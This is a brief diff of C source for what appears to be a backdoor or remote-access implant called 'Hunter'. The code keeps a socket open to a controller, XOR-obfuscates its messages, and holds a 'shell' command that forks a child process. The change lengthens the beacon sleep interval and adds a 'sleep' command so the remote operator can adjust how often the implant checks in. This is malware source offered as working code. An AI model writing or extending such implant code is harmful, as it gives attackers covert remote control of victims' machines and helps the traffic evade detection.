@@ -18,7 +18,7 @@ int connection_established;
 int sock;
 char buf[MAXBUF];
 int bufsize;
-int sleeptime = 5;
+int sleeptime = 20;
 
 int main(void)
 {
@@ -60,7 +60,6 @@ int main(void)
 			
 			if(str_starts_with(xorbuf, "shell") == 0)
 			{
-
 				int status;
 				pid_t child_pid;
 				FILE* fp;
@@ -94,6 +93,14 @@ int main(void)
 
 				waitpid(child_pid, &status, WNOHANG);
 
+			}
+			else if(str_starts_with(xorbuf, "sleep") == 0){
+				char* cmd = split(xorbuf, " ");
+				sleeptime = atoi(cmd);
+				char* sleepmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
+				char* xorsleepmsg = XOR(sleepmsg, key, strlen(sleepmsg), keylen);
+				write(sock, xorsleepmsg, strlen(sleepmsg));
+				free(xorsleepmsg);
 			}
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
